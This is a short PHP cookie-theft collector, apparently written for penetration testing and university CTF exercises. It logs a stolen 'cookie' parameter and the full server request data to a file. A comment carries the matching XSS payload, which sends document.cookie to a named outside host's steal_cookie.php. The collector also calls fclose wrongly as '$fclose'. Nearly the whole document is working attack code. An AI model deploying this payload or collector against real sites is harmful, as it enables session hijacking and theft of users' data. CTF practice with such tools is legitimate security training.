#!/usr/local/bin/php
<?php
/* For educational purposes only or whatever.
 * Used for Pen Testing/UFSIT CTF's. */

$cookie_jar = fopen("cookie_jar.txt", "a");
fwrite($cookie_jar, "Cookie:\t".json_encode($_GET['cookie'])."\n");
fwrite($cookie_jar, "Full Info:\n".json_encode($_SERVER)."\n\n");
$fclose($cookie_jar);

/* Companion XSS request:

<script>
function reqListener () {
  console.log('ur cookies r haxxored');
}

var req = new XMLHttpRequest();
req.addEventListener("load", reqListener);
req.open("GET", "http://www.cise.ufl.edu/~jj3/steal_cookie.php?cookie="+document.cookie);
req.send();
</script>

*/

?>
